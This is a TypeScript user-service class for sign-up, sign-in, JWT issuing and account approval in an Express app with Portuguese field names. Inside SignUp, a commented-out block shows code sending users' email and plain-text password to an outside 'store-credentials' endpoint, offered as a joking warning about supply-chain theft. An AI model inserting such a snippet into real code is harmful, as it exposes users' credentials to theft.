import { Container, Service, Inject } from 'typedi';

import jwt from 'jsonwebtoken';
import config from '../../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';

//import MailerService from './mailer.ts.bak';

import IUserService from '../services/IServices/IUserService';
import { UserMap } from "../mappers/UserMap";
import { IUserDTO } from '../dto/IUserDTO';

import IUserRepo from './IRepos/IUserRepo';
import IRoleRepo from './IRepos/IRoleRepo';

import { User } from '../domain/user';
import { UserPassword } from '../domain/userPassword';
import { UserEmail } from '../domain/userEmail';

import { Role } from '../domain/role';
import { Telefone } from '../domain/telefone';

import { Result } from "../core/logic/Result";
import { NumeroContribuinte } from '../domain/numeroContribuinte';
import { ConstantColorFactor } from 'three';
import { UserEstado } from '../domain/userEstado';
import e from 'express';
import { convertToObject } from 'typescript';

@Service()
export default class UserService implements IUserService {
  constructor(
    @Inject(config.repos.user.name) private userRepo: IUserRepo,
    @Inject(config.repos.role.name) private roleRepo: IRoleRepo,
    @Inject('logger') private logger,
  ) {}

  public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO; token: string }>> {
    try {
      console.log('userDTO', userDTO);
      const userDocument = await this.userRepo.findByEmail(userDTO.email);
      const found = !!userDocument;

      if (found) {
        return Result.fail<{ userDTO: IUserDTO; token: string }>(
          'Já existe um utilizador registado com o email= ' + userDTO.email,
        );
      }

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */

      const salt = randomBytes(32);
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userDTO.password, { salt });
      this.logger.silly('Creating user db record');

      const password = await UserPassword.create({ value: hashedPassword, hashed: true });
      if (password.isFailure) {
        return Result.fail<{ userDTO: IUserDTO; token: string }>(password.errorValue());
      }
      const email = await UserEmail.create(userDTO.email);
      if (email.isFailure) {
        return Result.fail<{ userDTO: IUserDTO; token: string }>(email.errorValue());
      }
      let role: Role;
      const telefone = await Telefone.create(userDTO.telefone);
      if (telefone.isFailure) {
        return Result.fail<{ userDTO: IUserDTO; token: string }>(telefone.errorValue());
      }

      const numeroContribuinte = await NumeroContribuinte.create(userDTO.numeroContribuinte);
      console.log(numeroContribuinte);
      if (numeroContribuinte.isFailure) {
        return Result.fail<{ userDTO: IUserDTO; token: string }>(numeroContribuinte.errorValue());
      }

      const roleOrError = await this.getRole(userDTO.role);
      if (roleOrError.isFailure) {
        return Result.fail<{ userDTO: IUserDTO; token: string }>(roleOrError.error);
      } else {
        role = roleOrError.getValue();
      }
      let estado = UserEstado.pendente;
      if (userDTO.estado == 'pendente') {
        estado = await UserEstado.pendente;
      } else if (userDTO.estado == 'aprovado') {
        estado = await UserEstado.aprovado;
      } else if (userDTO.estado == 'recusado') {
        estado = await UserEstado.recusado;
      }
      const userOrError = await User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        email: email.getValue(),
        telefone: telefone.getValue(),
        role: role,
        password: password.getValue(),
        numeroContribuinte: numeroContribuinte.getValue(),
        estado: estado,
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }
      const userResult = userOrError.getValue();

      this.logger.silly('Generating JWT');
      const token = this.generateToken(userResult);

      this.logger.silly('Sending welcome email');
      //await this.mailer.SendWelcomeEmail(userResult);

      //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });

      await this.userRepo.save(userResult);
      const userDTOResult = UserMap.toDTO(userResult) as IUserDTO;
      return Result.ok<{ userDTO: IUserDTO; token: string }>({ userDTO: userDTOResult, token: token });
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async SignIn(email: string, password: string): Promise<Result<{ userDTO: IUserDTO; token: string }>> {
    const user = await this.userRepo.findByEmail(email);
    if (!user) {
      throw new Error('User not registered');
    }

    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */
    this.logger.silly('Checking password');
    const validPassword = await argon2.verify(user.password.value, password);
    if (validPassword) {
      this.logger.silly('Password is valid!');
      this.logger.silly('Generating JWT');
      const token = this.generateToken(user) as string;

      const userDTO = UserMap.toDTO(user) as IUserDTO;
      return Result.ok<{ userDTO: IUserDTO; token: string }>({ userDTO: userDTO, token: token });
    } else {
      throw new Error('Invalid Password');
    }
  }

  private generateToken(user) {
    const today = new Date();
    const exp = new Date(today);
    exp.setDate(today.getDate() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */
    this.logger.silly(`Sign JWT for userId: ${user._id}`);

    const id = user.id.toString();
    const email = user.email.value;
    const firstName = user.firstName;
    const lastName = user.lastName;
    const role = user.role.name;
    const telefone = user.telefone.value;
    const numeroContribuinte = user.numeroContribuinte.value;
    const estado = user.estado.estado;

    return jwt.sign(
      {
        id: id,
        email: email, // We are gonna use this in the middleware 'isAuth'
        role: role,
        firstName: firstName,
        lastName: lastName,
        telefone: telefone,
        numeroContribuinte: numeroContribuinte,
        estado: estado,
        exp: exp.getTime() / 1000,
      },
      config.jwtSecret,
    );
  }

  private async getRole(roleId: string): Promise<Result<Role>> {
    const role = await this.roleRepo.findByName(roleId);
    const found = !!role;

    if (found) {
      return Result.ok<Role>(role);
    } else {
      return Result.fail<Role>("Couldn't find role by id=" + roleId);
    }
  }

  public async DeleteUser(email: string): Promise<Result<void>> {
    const user = await this.userRepo.findByEmail(email);
    if (!user) {
      throw new Error('User not registered');
    }

    await this.userRepo.deleteUser(user);
    return Result.ok<void>();
  }

  public async getPendentes(): Promise<Result<IUserDTO[]>> {
    const estado = await UserEstado.pendente;
    const users = await this.userRepo.getByEstado(estado);
    const usersDTO = users.map(user => UserMap.toDTO(user) as IUserDTO);
    return Result.ok<IUserDTO[]>(usersDTO);
  }

  public async aprovarUser(email: string): Promise<Result<IUserDTO>> {
    const user = await this.userRepo.findByEmail(email);
    if (!user) {
      throw new Error('User not registered');
    }
    user.updateEstado(await UserEstado.aprovado);
    await this.userRepo.save(user);
    const userDTO = UserMap.toDTO(user) as IUserDTO;
    return Result.ok<IUserDTO>(userDTO);
  }

  public async recusarUser(email: string): Promise<Result<IUserDTO>> {
    const user = await this.userRepo.findByEmail(email);
    if (!user) {
      throw new Error('User not registered');
    }

    user.updateEstado(await UserEstado.recusado);
    await this.userRepo.save(user);
    const userDTO = UserMap.toDTO(user) as IUserDTO;
    return Result.ok<IUserDTO>(userDTO);
  }

  public async getUser(email: string): Promise<Result<IUserDTO>> {
    const user = await this.userRepo.findByEmail(email);
    if (!user) {
      throw new Error('User not registered');
    }

    const userDTO = UserMap.toDTO(user) as IUserDTO;
    return Result.ok<IUserDTO>(userDTO);
  }

  public async getUtentes(): Promise<Result<IUserDTO[]>> {
    console.log("getUsers");
    const estado = await UserEstado.aprovado;
    const users = await this.userRepo.getByEstado(estado);
    const usersDTO = users.map(user => UserMap.toDTO(user) as IUserDTO);
    return Result.ok<IUserDTO[]>(usersDTO);
  }

  public async updateUser(userDTO: IUserDTO): Promise<Result<IUserDTO>> {
    try {
      const user = await this.userRepo.findByEmail(userDTO.email);

      if (user === null) {
        return Result.fail<IUserDTO>('User not found');
      } else {
        user.firstName = userDTO.firstName;
        user.lastName = userDTO.lastName;
        user.telefone = Telefone.create(userDTO.telefone).getValue();
        user.numeroContribuinte = NumeroContribuinte.create(userDTO.numeroContribuinte).getValue();

        await this.userRepo.save(user);
        const userDTOResult = UserMap.toDTO(user) as IUserDTO;
        return Result.ok<IUserDTO>(userDTOResult);
      }
    } catch (e) {
      throw e;
    }
  }
}